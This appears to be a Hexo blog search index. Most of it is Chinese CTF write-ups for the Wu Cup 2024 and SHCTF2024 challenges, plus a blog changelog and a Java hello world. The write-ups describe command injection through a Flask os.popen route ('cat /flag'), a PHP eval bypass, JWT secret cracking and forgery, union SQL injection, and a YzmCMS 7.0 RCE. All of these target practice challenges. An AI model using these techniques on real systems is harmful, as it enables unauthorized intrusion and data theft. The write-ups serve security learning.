class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    T = [<span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 密钥调度算法 (KSA)</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + T[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 伪随机生成算法 (PRGA)</span></span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        x = (S[i] + S[j]) % <span class="number">256</span></span><br><span class="line">        result.append(data[m] ^ S[x])</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知密钥</span></span><br><span class="line">key = <span class="string">&quot;hello world&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 十六进制的 flag</span></span><br><span class="line">hex_flag = <span class="string">&quot;d8d2963e0d8ab8533d2a7fe296c5292339246eba0d292d5752578359322c3a77892dfa7261b84f&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将十六进制字符串转换为字节</span></span><br><span class="line">data = <span class="built_in">bytes</span>.fromhex(hex_flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密 flag</span></span><br><span class="line">decrypted_flag = rc4(key, data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted Flag:&quot;</span>, decrypted_flag.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/Wu_Cup2024/12.png" width="" /></p><p>赛后看了其他师傅的wp，想试一下用赛博厨子（还没用过不会用），结果出来乱码。。。。</p><p><img src="/img/Wu_Cup2024/11.png" width="70%" /></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="sign"><a href="#sign" class="headerlink" title="sign"></a>sign</h2><h3 id="解题思路：-2"><a href="#解题思路：-2" class="headerlink" title="解题思路："></a>解题思路：</h3><p>当时密码和misc的签到都做出来了，偏偏web的不出，一个web手轻轻地碎了。</p><p>访问题目页面就给了passwd:sgin,看题目描述考虑post传参passwd=sgin，然后就。。。。失败了，然后盯着看了好久还是没思路，放弃了。后面题目放了hint，真的很简单，蚁剑连一下就行了，密码就是sign，flag就在根目录下。</p><p><img src="/img/Wu_Cup2024/13.png" width="70%" /></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Misc </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SHCTF2024 WriteUp</title>
      <link href="/2024/11/30/SHCTF2024-WP/"/>
      <url>/2024/11/30/SHCTF2024-WP/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Week-1"><a href="#Week-1" class="headerlink" title="Week 1"></a>Week 1</h2><h3 id="1-1zflask"><a href="#1-1zflask" class="headerlink" title="1. 1zflask"></a>1. 1zflask</h3><h4 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h4><p>首先打开容器发现出现404网页，刚开始很懵，后来明白了原来是出题人没做主页<del>nishen太懒</del>。根据题目描述，<br>我们访问robots.txt，发现一个/s3recttt路由，访问下载源码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request,  send_from_directory, send</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api</span>():</span><br><span class="line">    cmd = request.args.get(<span class="string">&#x27;SSHCTFF&#x27;</span>, <span class="string">&#x27;ls /&#x27;</span>)</span><br><span class="line">    result = os.popen(cmd).read()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/robots.txt&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">static_from_root</span>():</span><br><span class="line">    <span class="keyword">return</span> send_from_directory(app.static_folder,<span class="string">&#x27;robots.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/s3recttt&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_source</span>():</span><br><span class="line">    dile_path = <span class="string">&quot;app.py&quot;</span></span><br><span class="line">    <span class="keyword">return</span> send_file(file_path, as_attachment=true)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug-<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们可以看到/api路由，默认传参SSHCTFF=ls /,执行结果通过os.open读取,访问该路由则会列出:</p><p><img src="/img/SHCTF2024/SH_1zflask1.png" width="50%" /></p><p>我们把参数值改一下变成SSHCTFF=cat /flag就能成功得到flag了。</p><p><img src="/img/SH_1zflask2.png" width="" /></p><h3 id="2-ez-gittt"><a href="#2-ez-gittt" class="headerlink" title="2. ez_gittt"></a>2. ez_gittt</h3><h4 id="解题思路：-1"><a href="#解题思路：-1" class="headerlink" title="解题思路："></a>解题思路：</h4><p>开启题目查看源码看到注释里有“你说这个Rxuxin会不会喜欢把自己的秘密写到git之类什么的”，可能存在git泄露，拿dirsearch扫一下确实存在，再用GitHack克隆目录，然后使用cd命令进入dist文件中新生成的文件，再使用git log命令查看历史提交记录，如下</p><p><img src="/img/SHCTF2024/git1.png" width="50%" /></p><p><img src="/img/SHCTF2024/git2.png" width="50%" /></p><h3 id="3-jvav"><a href="#3-jvav" class="headerlink" title="3.jvav"></a>3.jvav</h3><h4 id="解题思路：-2"><a href="#解题思路：-2" class="headerlink" title="解题思路："></a>解题思路：</h4><p>开启题目发现如图输入框，而且可以执行</p><p><img src="/img/SHCTF2024/jvav1.png" width="50%" /></p><p>再根据题目描述“如果你已经会用java写hello world了，那么可以试试java怎么执行system command”，题目意思很明确，我们只需要用java写实现命令执行的代码就行了，不会写直接AI一把梭就行了，需要注意的是我们定义的类需要是demo（public class demo），然后按部就班ls /再cat /flag就行了。flag： SHCTF{1cd97424-7553-4571-a6cc-c9d7a2cc8237}</p><h3 id="4-蛐蛐？-蛐蛐！"><a href="#4-蛐蛐？-蛐蛐！" class="headerlink" title="4. 蛐蛐？ 蛐蛐！"></a>4. 蛐蛐？ 蛐蛐！</h3><h4 id="解题思路：-3"><a href="#解题思路：-3" class="headerlink" title="解题思路："></a>解题思路：</h4><p>首先查看源码发现有个重要的source.txt，访问一下得到如下代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ququ&#x27;</span>] == <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ququ&#x27;</span>])!= <span class="number">415411</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ququ&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="variable">$eval_param</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ququ&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strncmp</span>(<span class="variable">$eval_param</span>,<span class="string">&#x27;ququk1&#x27;</span>,<span class="number">6</span>)===<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ququ&#x27;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;不知道为啥变乱码了&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">ehco</span>(<span class="string">&quot;不知道为啥变乱码了&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;不知道为啥变乱码了&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>第一个条件get传参ququ=114514，但其反转字符串不等于415411，ququ=114514a就能绕过，然后post传参，并且当前六个字段是ququk1时，eval函数会将ququ的值作为php代码执行（注意代码闭合不要漏了;），简单的rce，直接常规ls 和cat得到flag。</p><h3 id="5-单身十八年的手速"><a href="#5-单身十八年的手速" class="headerlink" title="5.单身十八年的手速"></a>5.单身十八年的手速</h3><h4 id="解题思路：-4"><a href="#解题思路：-4" class="headerlink" title="解题思路："></a>解题思路：</h4><p>点击就送flag（偷个懒）。</p><h2 id="Week-2"><a href="#Week-2" class="headerlink" title="Week 2"></a>Week 2</h2><h3 id="1-guess-the-number"><a href="#1-guess-the-number" class="headerlink" title="1. guess_the_number"></a>1. guess_the_number</h3><h4 id="解题思路：-5"><a href="#解题思路：-5" class="headerlink" title="解题思路："></a>解题思路：</h4><p>打开容器要求我们输入一个数字，先审计源码，发现一个新的路由/s0urce ，访问一下，得到一个.py文件，文件中包含以下代码。</p><p><img src="/img/SHCTF2024/2.png" width="" /></p><p><img src="/img/SHCTF2024/1.png" width="" /></p><p>审一下代码再根据题目描述易知这是一道伪随机数生成的题目，我们只需要找到seed，就能得到对应生成的num1,num2,编写一个脚本来帮助我们完成这项工作。审一下代码再根据题目描述易知这是一道伪随机数生成的题目，我们只需要找到seed，就能得到对应生成的num1,num2,编写一个脚本来帮助我们完成这项工作。回到题目将5188946490打进输入框，就能成功得到flag。</p><p><img src="/img/SHCTF2024/3.png" width="" /></p><p>flag为SHCTF{7his_NUm6ER_i5_e45y_huEs5_1cdb9cf5f25e}</p><h3 id="2-登陆验证"><a href="#2-登陆验证" class="headerlink" title="2. 登陆验证"></a>2. 登陆验证</h3><h4 id="解题思路：-6"><a href="#解题思路：-6" class="headerlink" title="解题思路："></a>解题思路：</h4><p>一个登录框，要提交Username和Passaword，可以爆破密码试一下，两个都输入admin，回显你不是admin，说明密码应该是对的结合题目，应该只有jwt验证，抓到拿到响应包中的jwt，解密，把’role’：”user”改成’role’：”admin”，签名无效，结合题目存在密钥加密，在kali中使用jwt_tool把密钥爆出来，我们用kali自带的rockyou.txt字典（使用前要解压缩）进行爆破得到密钥为222333。用修改好的jwt重新发包得到flag。</p><p><img src="/img/SHCTF2024/5.png" width="" /></p><p><img src="/img/SHCTF2024/4.png" width="%50" /></p><p>也可以直接在网页修改token，把修改好的jwt贴进去，刷新一下页面就会能得到flag了。</p><p><img src="/img/SHCTF2024/6.png" width="" /></p><h3 id="3-自助查询"><a href="#3-自助查询" class="headerlink" title="3.自助查询"></a>3.自助查询</h3><h4 id="解题思路：-7"><a href="#解题思路：-7" class="headerlink" title="解题思路："></a>解题思路：</h4><p>很明显是一个sql注入，输入1查询，回显的语句是SELECT username,password FROM users WHERE id=(“1<br>很明显是字符型注入需要我们用”)闭合，然后常规操作，联合查询注入，爆库爆表爆字段，查到字段内容后我们发现出题人把东西藏到注释里了，我们查看注释得到flag。</p><p><img src="/img/SHCTF2024/7.png" width="" /></p><h2 id="Week-3"><a href="#Week-3" class="headerlink" title="Week 3"></a>Week 3</h2><h3 id="1-小小cms"><a href="#1-小小cms" class="headerlink" title="1. 小小cms"></a>1. 小小cms</h3><h4 id="解题思路：-8"><a href="#解题思路：-8" class="headerlink" title="解题思路："></a>解题思路：</h4><p>扫目录发现管理员入口，访问，有验证码不好爆破先不考虑，查了以下这是yzmcms的后台登陆入口，有默认账号密码，且都是yzmcms，登进去sql语句执行被ban了，搞不了，</p><p><img src="/img/SHCTF2024/8.png" width="" /></p><p><img src="/img/SHCTF2024/9.png" width="" /></p><p>看一下数据管理的内容发现flag，备份后下载打开,fake难绷，返返回网站首页可以看到yzmcms是7.0版本的，去搜一下该版本存在的历史漏洞，该版本存在rce漏洞这就和题目描述相吻合了，我找了一个漏洞复现做参考<a href="https://blog.csdn.net/shelter1234567/article/details/138524342">YzmCMS 7.0任意函数调用RCE 漏洞研究分析</a>。</p><p><img src="/img/SHCTF2024/10.png" width="%50" /></p><p><img src="/img/SHCTF2024/11.png" width="%50" /></p><p>有现成payload，修改一下法宝得到flag。</p><p><img src="/img/SHCTF2024/12.png" width="%50" /></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>欢迎来到我的博客！</title>
      <link href="/2024/11/30/%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2%EF%BC%81/"/>
      <url>/2024/11/30/%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<h1 id="欢迎来到我的博客！！！"><a href="#欢迎来到我的博客！！！" class="headerlink" title="欢迎来到我的博客！！！"></a>欢迎来到我的博客！！！</h1><p>这里是 Q3q_c1n 的个人博客。</p><p>本页主要发布更新日志，想了解我多一点点请<del>看VCR</del>到关于页面瞅瞅。</p><hr><h2 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h2><div class="timeline blue 小站建设进程"><div class='timeline-item'>        <div class='timeline-item-title'>          <div class='item-circle'><p><strong>2024-11-30 13:52:00</strong></p></div>        </div>        <div class='timeline-item-content'><p><strong>历时两年半(bushi应该两三天吧，哈哈<del>我宣布我的个人博客正式启动！！！</del></strong></p><font size = 5 color=red>那不是黑历史，是我的来时路</font><p>因为本人有点强迫症，一准备搭博客就想一次性搞好，所以也就没有一步一步的更新日志。<br>下面统一说明：</p><ol><li>本站以Hexo为框架，Butterfly为主题搭建的，找了一些教程魔改了以下，现在看起来还是美观很多的。</li><li>由于魔改已经进行了大半，就不一一列举了，后面有改动的话再写进该日志里。</li><li>目前还有一些功能没实现，清单中的音乐、照片、电影和友链目前没哈用，留言板我也不知道有没有用，至少是有东西的。</li><li>感觉文章内的字体还是有点小，后面有时间载改进吧。</li><li>图片都是朋友给的，不过还不太够用，愿意提供的可以联系我。  </li><li>在网上找了一堆教程，从0到有的这几天的天真的很黑~</li></ol></div>      </div><div class='timeline-item'>        <div class='timeline-item-title'>          <div class='item-circle'><p><strong>2024-11-30 16:04:00</strong></p></div>        </div>        <div class='timeline-item-content'><p>目前只把SHCTF2024 week1 的wp写上去了，之前的wp到底怎么打包copy过来啊，重写累似了，以后wp直接写这了…<br>其他的wp后续有空再补上吧。</p></div>      </div><div class='timeline-item'>        <div class='timeline-item-title'>          <div class='item-circle'><p><strong>2024-12-03 19:58:00</strong></p></div>        </div>        <div class='timeline-item-content'><p>更新了第一届 “吾杯” 网络安全技能大赛 (复现)，来看看吧！<br>比赛环境只保留了四个小时，没来得及复现，misc题刚好下了附件，能复现一下。</p></div>      </div><div class='timeline-item'>        <div class='timeline-item-title'>          <div class='item-circle'><p><strong>2024-12-04 11:11:00</strong></p></div>        </div>        <div class='timeline-item-content'><p>更新了第一届 CYBERGON_CTF 2024 (复现) .</p></div>      </div><div class='timeline-item'>        <div class='timeline-item-title'>          <div class='item-circle'><p><strong>2025-2-7 19:55:54</strong></p></div>        </div>        <div class='timeline-item-content'><p>站长经过两天的不懈努力，把小站重新搭建了一番，还增加了不少功能，例如音乐，文章统计和评论功能等，还购买了自定义域名进行绑定，网站即刻正式启动！！！网站是开源的，欢迎大家学习QWQ</p></div>      </div></div>]]></content>
      
      
      <categories>
          
          <category> 更新日志 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java</title>
      <link href="/2024/11/30/java/"/>
      <url>/2024/11/30/java/</url>
      
        <content type="html"><![CDATA[<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyFirstJavaProgram</span> &#123;</span><br><span class="line">   <span class="comment">/* 第一个Java程序.</span></span><br><span class="line"><span class="comment">    * 他将打印字符串 Hello World</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String []args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello Welcome to learn 加瓦炒粉&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
